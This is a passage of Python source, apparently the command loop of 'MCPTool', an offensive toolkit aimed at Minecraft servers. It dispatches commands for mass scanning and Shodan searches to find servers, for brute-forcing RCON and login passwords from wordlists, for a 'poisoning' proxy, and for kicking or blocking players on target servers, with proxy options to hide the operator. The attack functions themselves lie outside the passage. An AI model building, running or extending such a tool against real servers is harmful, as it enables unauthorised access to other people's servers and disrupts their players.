                    current_ip_backup = current_ip

                    try:
                        current_ip = current_ip.split(' ')
                        current_ip = current_ip[1]

                    except IndexError:
                        current_ip = current_ip_backup

                    scan_results.write(f'{current_ip}:{port}\n')

        elif method == '1':  # Qubo
            for line in scan__result:
                ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}', line)
                ip = ' '.join(ip)

                if ':' in ip:
                    scan_results.write(f'{ip}\n')

        scan_results.close()
    try:
        with open(scan_ip_list) as scan_results:
            for line in scan_results:
                line = line.replace('\n', '')
                ip, motd, version, protocol, players_online, max_players, players, log_motd, log_version = get_server_data(line)  # Returns server data
                show__server = show_server(ip, motd, version, protocol, players_online, max_players, players, proxy)  # Show server data

                if show__server[0]:
                    save_server(ip, log_motd, log_version, protocol, players_online, max_players, players, show__server[1])  # Save server data
                    scanned_servers += 1

    except KeyboardInterrupt:
        try:
            os.remove(scan_ip_list)
            os.remove(scan_file)

        except FileNotFoundError:
            pass

    try:
        os.remove(scan_ip_list)
        os.remove(scan_file)

    except FileNotFoundError:
        pass

    fix_file()


def main():
    """
    Main
    """

    global connect_bot, host_command, first, scanned_servers, scanned_servers, scan_stopped, logs_file

    while True:
        try:
            print(f'\n{reset}{red}    root@{system}:~/MCPTool/ {lblack}» {white}', end='')
            arguments = input().split()
            command = arguments[0]
            host_command = False
            connect_bot = 'n'
            proxy = None

            if command.lower() == 'help':  # Show help message
                try:
                    option = arguments[1]

                    if option.isnumeric():
                        option = int(option)

                        if 1 <= option <= 5:
                            print(help_messages[option])

                        else:
                            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid page. (1-5)')

                    else:
                        num = 0
                        valid_command = False

                        for cmd in command_list:
                            if option.lower() == cmd:
                                print(help_messages_list_commands[num])
                                valid_command = True
                                break

                            num += 1

                        if not valid_command:
                            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid command.')

                except IndexError:
                    print(f'\n{white}    Usage: help <page/command>\n\n    {white}You can also see the guide found on Github: {lgreen}www.coming-soon.com')

            elif command.lower() == 'clear' or command.lower() == 'cls':  # Clean the terminal
                subprocess.run('cls || clear', shell=True)
                print(banner, end='')

            elif command.lower() == 'srv' or command.lower() == 'server':
                try:
                    target = arguments[1]
                    connect_bot = 'n'
                    
                    try:
                        server_command(target)

                    except KeyboardInterrupt:
                        pass

                except IndexError:
                    print(f'\n{white}    Usage: server <ip:port/domain>')

            elif command.lower() == 'player':
                try:
                    username = arguments[1]
                    premium_uuid, premium_uuid_, offline_uuid, offline_uuid_ = get_player(username)

                    if premium_uuid is not None:
                        print(f'\n    {red}[{lred}UU{white}ID{red}] {white}{premium_uuid}')
                        print(f'    {red}[{lred}UU{white}ID{red}] {white}{premium_uuid_}\n')
                        print(f'    {red}[{lred}UUID{white} OFFLINE{red}] {white}{offline_uuid}')
                        print(f'    {red}[{lred}UUID{white} OFFLINE{red}] {white}{offline_uuid_}')

                    else:
                        print(f'\n    {red}[{lred}UUID{white} OFFLINE{red}] {white}{offline_uuid}')
                        print(f'    {red}[{lred}UUID{white} OFFLINE{red}] {white}{offline_uuid_}')

                except IndexError:
                    print(f'\n{white}    Usage: player <username>')

            elif command.lower() == 'ip':
                try:
                    domain = arguments[1]

                    ip_address = socket.gethostbyname(domain)
                    print(f'\n    {red}[{lred}I{white}P{red}] {white}{ip_address}')

                except socket.error:
                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The domain is not valid.')
                    
                except IndexError:
                    print(f'\n{white}    Usage: ip <domain>')

            elif command.lower() == 'ipinfo':
                try:
                    ip_address = arguments[1]
                    socket.inet_pton(socket.AF_INET, ip_address)  # Check the IP address

                    r = requests.get(f'http://ip-api.com/json/{ip_address}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,timezone,isp,org,as,asname,reverse,query')
                    r_json = r.json()

                    if r_json['status'] == 'success':
                        continent = r_json['continent']
                        continentCode = r_json['continentCode']
                        country = r_json['country']
                        countryCode = r_json['countryCode']
                        region = r_json['region']
                        regionName = r_json['regionName']
                        city = r_json['city']
                        timezone = r_json['timezone']
                        isp = r_json['isp']
                        org = r_json['org']
                        as_ = r_json['as']
                        asname = r_json['asname']
                        reverse = r_json['reverse']

                        print(f'\n    {red}[{lred}Conti{white}nent{red}] {white}{continent} ({lred}{continentCode}{white})')
                        print(f'    {red}[{lred}Coun{white}try{red}] {white}{country} ({lred}{countryCode}{white})')
                        print(f'    {red}[{lred}Reg{white}ion{red}] {white}{regionName} ({lred}{region}{white})')
                        print(f'    {red}[{lred}Ci{white}ty{red}] {white}{city} ({lred}{timezone}{white})')
                        print(f'    {red}[{lred}IS{white}P{red}] {white}{isp} ({lred}{org}{white})')
                        print(f'    {red}[{lred}A{white}S{red}] {white}{asname} ({lred}{as_}{white})')

                        if reverse != '':
                            print(f'    {red}[{lred}Reve{white}rse{red}] {white}{reverse}')

                    else:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address is not valid.')
                        
                except requests.exceptions.ConnectionError:
                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Could not connect to API.')

                except socket.error:
                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address is not valid.')

                except IndexError:
                    print(f'\n{white}    Usage: ipinfo <ip>')

            elif command.lower() == 'search':
                try:
                    _ = arguments[1]

                    text = ' '.join(arguments)
                    data = text[7:]
                    data = data.split(' --- ')
                    search = shodan.Shodan(shodan_token)
                    server_list = []
                    ip_list = []
                    scanned_servers = 0

                    for d in data:
                        print(f'\n    {red}[{lred}SEA{white}RCH{red}] {white}Searching for servers containing the following data -> {lgreen}{d}{white}')
                        servers = search.search(d)

                        for server in servers['matches']:
                            ip = str(server['ip_str'])
                            port = str(server['port'])
                            server_list.append(f'{ip}:{port}')
                            ip_list.append(ip)

                    if len(server_list) == 0:
                        print(f'\n    {red}[{lred}SEA{white}RCH{red}] {white}No servers were found with the specified data')
                        continue

                    check_folder('logs', 'logs/search')
                    data = ' '.join(data)
                    logs_file = save_logs(data, f'logs/search/Search', 'search', '[•] Servers Found:')

                    for server in server_list:
                        ip, motd, version, protocol, players_online, max_players, players, log_motd, log_version = get_server_data(server)
                        show__server = show_server(ip, motd, version, protocol, players_online, max_players, players, None)  # Show server data

                        if show__server[0]:
                            save_server(ip, log_motd, log_version, protocol, players_online, max_players, players, show__server[1])
                            scanned_servers += 1

                    print(f'\n    {red}[{lred}FINI{white}SHED{red}] {white}The server search has finished and {scanned_servers} servers were found')
                        
                except shodan.exception.APIError as e:
                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}{e}')

                except KeyboardInterrupt:
                    print(f'\n    {red}[{lred}CHE{white}CKER{red}] {white}Stopping the search..')

                except IndexError:
                    print(f'\n{white}    Usage: search <data>')

            elif command.lower() == 'scan':
                try:
                    target = arguments[1]
                    ports = arguments[2]
                    method = arguments[3]
                    connect_bot = arguments[4].lower()

                    method = check_scan_method(method)

                    if method.isdecimal() and int(method) <= 1:
                        if connect_bot == 'y' or connect_bot == 'n':
                            try:
                                proxy = arguments[5]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            scanned_servers = 0
                            scan_stopped = False

                            if '.txt' in target:  # Scan a list of ip addresses (from a text file)
                                ip_list = []
                                num = 0

                                try:
                                    with open(target) as lines:
                                        for line in lines:
                                            line = line.replace('\n', '')

                                            try:
                                                socket.inet_aton(line)
                                                num += 1
                                                ip_list.append(line)

                                            except OSError:
                                                pass

                                except FileNotFoundError:
                                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file {target} was not found.')
                                    continue

                                if num >= 1:
                                    for ip in ip_list:
                                        error = scan(ip, ports, method, None, proxy)

                                        if not error:
                                            print(f'\n    {red}[{lred}FINI{white}SHED{red}] {white}The scan finished and found {scanned_servers} servers.')

                                else:
                                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}No IP addresses found in the file.')

                            else:
                                error = scan(target, ports, method, None, proxy)

                                if not error:
                                    print(f'\n    {red}[{lred}FINI{white}SHED{red}] {white}The scan finished and found {scanned_servers} servers.')

                        else:
                            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}You must specify if you want a bot to check the server (y/n).')

                    else:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid method. \n\n     {white}0 - {lred}Nmap\n     {white}1 - {lred}QuboScanner')

                except IndexError:
                    print(f'\n{white}    Usage: scan <ip> <ports> <method> <checker y/n> [<proxy>]')

            elif command.lower() == 'host':
                try:
                    host = arguments[1].lower()
                    ports = arguments[2]
                    method = arguments[3]

                    connect_bot = arguments[4].lower()

                    num_nodes = 0
                    method = check_scan_method(method)

                    if host in hosts:
                        if method.isdecimal() and int(method) <= 2:
                            if connect_bot == 'y' or connect_bot == 'n':
                                try:
                                    proxy = arguments[5]
                                    check = set_proxy(proxy)

                                    if not check:
                                        continue

                                except IndexError:
                                    proxy = None

                                host_command = True
                                first = True
                                scan_stopped = False
                                scanned_servers = 0

                                host_nodes, domain = get_host_information(host)
                                nodes = []

                                print(f'\n    {red}[{lred}SCAN{white}NER{red}] {white}', end='')
                                animated_text('Searching for available nodes..', 0.04)

                                for node in host_nodes:
                                    try:
                                        ip = socket.gethostbyname(f'{str(node)}{str(domain)}')
                                        num_nodes += 1
                                        nodes.append(ip)

                                    except (socket.gaierror, socket.timeout):
                                        pass

                                if num_nodes == 0:
                                    print(f'\n\n    {red}[{lred}ERR{white}OR{red}] {white}No active nodes were found.')

                                else:
                                    print(f'\n\n    {red}[{lred}NO{white}DE{red}] {white}Found nodes: {num_nodes}')
                                    time.sleep(1)

                                    for node in nodes:
                                        error = scan(node, ports, method, host, proxy)
                                        first = False

                                        if error:
                                            break

                                    if not error:
                                        print(f'\n    {red}[{lred}FINI{white}SHED{red}] {white}The scan finished and found {scanned_servers} servers.')

                            else:
                                print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}You must specify if you want a bot to check the server (y/n).')

                        else:
                            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid method. \n\n     {white}0 - {lred}Nmap\n     {white}1 - {lred}QuboScanner')

                    else:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid host. ({lgreen}', end='')
                        host_list = ''

                        for ht in hosts:
                            host_list = f'{host_list}{ht} '

                        host_list = host_list[:-1]
                        print(f'{host_list}{white})')

                except IndexError:
                    print(f'\n{white}    Usage: host <hostname> <ports> <method> [checker y/n]')

            elif command.lower() == 'checker':
                try:
                    file = arguments[1]
                    connect_bot = arguments[2].lower()

                    ip_list = []
                    num = 0
                    scanned_servers = 0

                    try:
                        check__encoding = check_encoding(file)

                    except FileNotFoundError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file {file} was not found.')
                        continue

                    with open(file, encoding=check__encoding) as f:
                        for line in f:
                            ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}', line)
                            ip = ' '.join(ip)

                            if ':' in ip:
                                num += 1
                                ip_list.append(ip)

                    if connect_bot == 'y' or connect_bot == 'n':
                        if num >= 1:
                            try:
                                proxy = arguments[3]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            check_folder('logs', 'logs/checker')
                            logs_file = save_logs(file, f'logs/checker/Checker', 'checker', '[•] Servers Found:')

                            try:
                                for ip in ip_list:
                                    ip, motd, version, protocol, players_online, max_players, players, log_motd, log_version = get_server_data(ip)
                                    show__server = show_server(ip, motd, version, protocol, players_online, max_players, players, proxy)  # Show server data

                                    if show__server[0]:
                                        save_server(ip, log_motd, log_version, protocol, players_online, max_players, players, show__server[1])
                                        scanned_servers += 1

                            except KeyboardInterrupt:
                                fix_file()
                                print(f'\n    {red}[{lred}CHE{white}CKER{red}] {white}Stopping the checker..')
                                continue

                            fix_file()
                            print(f'\n    {red}[{lred}FINI{white}SHED{red}] {white}The scan finished and found {scanned_servers} servers.')

                        else:
                            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}No IP addresses found in the file.')
                    else:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}You must specify if you want a bot to check the server (y/n).')

                except IndexError:
                    print(f'\n{white}    Usage: checker <file> <checker: y/n> [<proxy>]')

            elif command.lower() == 'listening':
                try:
                    target = arguments[1]
                    listening(target)

                except IndexError:
                    print(f'\n{white}    Usage: listening <ip:port/domain>')

            elif command.lower() == 'bungee':
                try:
                    target = arguments[1]
                    start_proxy_server(target, bungee_port, 'bungee', False)

                except IndexError:
                    print(f'\n{white}    Usage: bungee <ip:port/domain>')

            elif command.lower() == 'poisoning':
                try:
                    target = arguments[1]
                    start_proxy_server(target, poisoning_port, 'poisoning', True)

                except IndexError:
                    print(f'\n{white}    Usage: poisoning <ip:port/domain>')
                    print(traceback.format_exc())

            elif command.lower() == 'rcon':
                try:
                    target = arguments[1]
                    password_list = arguments[2]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            rcon_attack(target[0], int(target[1]), password_list)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: rcon <ip:rcon-port> <file>')

            elif command.lower() == 'auth':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    password_list = arguments[3]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        try:
                            protocol = arguments[4]

                        except IndexError:
                            protocol = get_protocol(f'{target[0]}:{target[1]}')

                        if check:
                            auth(target[0], int(target[1]), protocol, username, password_list)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: auth <ip:port> <username> <file> [<protocol>]')

            elif command.lower() == 'connect':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    protocol = arguments[3]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            try:
                                proxy = arguments[5]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            connect(target[0], target[1], protocol, username, proxy)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: connect <ip:port> <username> <version> [<proxy>]')

            elif command.lower() == 'rconnect':
                try:
                    target = arguments[1]
                    password = arguments[2]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            rcon_connection(target[0], target[1], password)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: rconnect <ip:rcon-port> <password>')

            elif command.lower() == 'kick':
                try:
                    target = arguments[1]
                    username = arguments[2]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            try:
                                proxy = arguments[5]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            protocol = get_protocol(f'{target[0]}:{target[1]}')
                            kick(target[0], int(target[1]), protocol, 'KI', 'CK', 'kick', username, proxy)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: kick <ip:port> <username> [<proxy>]')

            elif command.lower() == 'kickall':
                try:
                    target = arguments[1]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            try:
                                proxy = arguments[5]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            protocol = get_protocol(f'{target[0]}:{target[1]}')
                            kick(target[0], int(target[1]), protocol, 'KICK', 'ALL', 'kickall', None, proxy)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: kick <ip:port> <username> [<proxy>]')

            elif command.lower() == 'block':
                try:
                    target = arguments[1]
                    username = arguments[2]

                    try:
                        target = target.split(':')
                        check = check_ip(target[0], target[1])

                        if check:
                            try:
                                proxy = arguments[5]
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                            except IndexError:
                                proxy = None

                            protocol = get_protocol(f'{target[0]}:{target[1]}')
                            kick(target[0], int(target[1]), protocol, 'BLO', 'CK', 'block', username, proxy)

                    except IndexError:
                        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid IP and port')

                except IndexError:
                    print(f'\n{white}    Usage: block <ip:port> <username> [<proxy>]')

            elif command.lower() == 'discord':
                print(f'''{lcyan}
                               
             ░░░░░░        ░░░░░
          ░░░░░░░░░░░░░░░░░░░░░░░░░          {magenta}Watermelon Discord Server{lcyan}
         ░░░░░░░░░░░░░░░░░░░░░░░░░░░  
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░        {white}Join my discord server for:{lcyan}
       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
       ░░░░░░░░░▒▒░░░░░░░░░▒▒▒░░░░░░░░░       {white}- Get help or report a bug about the tool.{lcyan}
      ░░░░░░░░▒▒▒▒▒▒░░░░░▒▒▒▒▒▒░░░░░░░░       {white}- Stay up to date with my projects.{lcyan}
      ░░░░░░░░▒▒▒▒▒▒░░░░░░▒▒▒▒▒░░░░░░░░       {white}- You can also talk to me through the server.{lcyan}
      ░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      {lred}> {white}Server link: {lred}discord.gg/ewPyW4Ghzj{lcyan}
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
         ░░░░░░░             ░░░░░░░
             ░░                ░\n''')

            elif command.lower() == 'update_proxy':  # Test
                check_proxy_version()

            else:
                print(f'\n    {red}[{red}-{red}] {lred}Unknown command. {white}Type {lgreen}help {white}to see the available commands.')

        except EOFError:
            pass

        except KeyboardInterrupt:
            print(f'\n\n    {red}[{red}>{red}] {white}Closing MCPTool... # Created by {lcyan}@wrrulos{reset}')
            break

        except IndexError:
            print(f'\n    {red}[{red}-{red}] {lred}Unknown command. {white}Type {lgreen}help {white}to see the available commands.')

        except Exception as e:
            check_folder('logs', 'logs/errors')
            file = save_logs(None, 'logs/errors/ERROR_', 'error', f'Error: {e}\n\n{traceback.format_exc()}')
            print(f'\n    {red}[{red}-{red}] {lred}Unknown error ({white}Error saved in {file}{lred}){reset}')


if __name__ == '__main__':
    try:
        save_settings()
        check_dependencies()

        if version_check:
            check__version = check_version()

            if check__version:
                subprocess.run('cls || clear', shell=True)
                print(f'{start_banner}                   {green}There is a new version of MCPTool available.\n\n                                           {white}You can download it now from github!\n\n                                            {lgreen}', end='')
                animated_text('https://github.com/wrrulos/MCPTool', 0.04)
                time.sleep(5)
                sys.exit()

        check__script_folders = check_script_folders()

        if not check__script_folders:
            subprocess.run('cls || clear', shell=True)
            print(f'{start_banner}           {lred}MCPTool folders not found. Open the tool properly to fix this.', end='')
            time.sleep(5)
            sys.exit()

    except KeyboardInterrupt:
        sys.exit()

    if os.name == 'nt':
        subprocess.run('title MCPTool', shell=True)

    if starting_screen:
        subprocess.run('cls || clear', shell=True)
        print(start_banner)

        for i in progressbar(range(15), '                           Starting MCPTool: ', 40):
            time.sleep(0.05)

    subprocess.run('cls || clear', shell=True)
    print(banner, end='')
    main()
